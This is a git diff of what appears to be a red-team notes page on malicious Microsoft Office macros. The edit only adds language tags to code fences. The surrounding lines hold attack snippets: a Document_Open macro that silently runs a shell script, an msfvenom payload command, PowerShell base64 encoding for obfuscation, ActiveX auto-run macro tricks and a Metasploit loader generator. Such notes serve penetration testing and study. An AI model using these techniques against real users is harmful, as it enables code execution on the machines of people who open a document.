@@ -8,7 +8,7 @@ to create a macro in an office word document:
 * Hit ALT+F11 to go into Macro editor
 * Double click into the "This document" and CTRL+C/V the below:
 
-```
+```vba
 Private Sub Document_Open()
   MsgBox "game over", vbOKOnly, "game over"
   a = Shell("C:\tools\shell.cmd", vbHide)
@@ -58,7 +58,7 @@ msfvenom -p windows/exec CMD=calc.exe EXITFUNC=thread
 
 ```
 
-```
+```powershell
 #Convert to Base64 Encoding
 $command = "calc"
 $bytes = [Text.Encoding]::Unicode.GetBytes($command)
@@ -210,7 +210,7 @@ Sub AutoOpen()
 * Each ActiveX control gives the option to add macros to its procedures.
 * [Leveraging Microsoft Ink Picture Control](https://www.greyhathacker.net/?p=948)
 
-```
+```vba
 #InkEdit Procedure - Ondisk footprint
 
 Sub InkEdit1_GotFocus()
@@ -254,7 +254,7 @@ Procedures able to automatically run macros :&#x20;
   * [Part-1](https://astr0baby.wordpress.com/2014/02/12/custom-meterpreter-loader-dll/)
   * [Part-2](https://astr0baby.wordpress.com/2014/02/13/customising-meterpreter-loader-dll-part-2/)
 
-```
+```bash
 #Metasploit Loader Generator:  Usage: ./loader.sh
 
 #!/bin/bash
